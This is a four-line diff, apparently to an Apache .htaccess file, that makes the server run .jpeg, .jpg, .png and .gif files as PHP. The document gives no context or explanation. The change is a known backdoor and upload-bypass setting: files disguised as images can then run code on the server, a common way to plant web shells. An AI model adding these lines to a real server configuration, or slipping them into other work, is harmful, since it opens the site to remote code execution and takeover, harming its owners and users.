@@ -1,0 +1,4 @@
+AddHandler application/x-httpd-php .jpeg
+AddHandler application/x-httpd-php .jpg
+AddHandler application/x-httpd-php .png
+AddHandler application/x-httpd-php .gif
